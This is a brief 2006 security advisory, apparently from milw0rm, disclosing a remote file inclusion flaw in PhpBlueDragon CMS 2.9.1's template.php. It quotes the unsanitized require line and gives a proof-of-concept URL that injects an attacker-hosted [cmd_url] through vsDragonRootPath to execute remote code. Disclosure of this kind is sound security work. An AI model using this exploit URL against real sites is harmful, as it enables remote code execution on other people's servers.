@@ -1,0 +1,30 @@
+-----------------------------------------------------
+Advisory id: FSA:015
+
+Author:    Federico Fazzi
+Date:      14/06/2006, 18:20
+Sinthesis: PhpBlueDragon CMS 2.9.1, File inclusion vulnerability
+Type:      high
+Product:   http://phpbluedragon.net/
+Patch:     unavailable
+-----------------------------------------------------
+
+
+1) Description:
+
+Error occured in template.php, line 23:
+
+---
+require($vsDragonRootPath."public_includes/pub_kernel/pbd_template_custom.php");
+---
+
+2) Proof of concept:
+
+http://example/[pbd_path]/software_upload/public_includes/pub_templates/vphptree/template.php?vsDragonRootPath=[cmd_url]/
+(note this is with final slash (/))
+
+3) Solution:
+
+sanitized $vsDragonRootPath
+
+# milw0rm.com [2006-06-14]
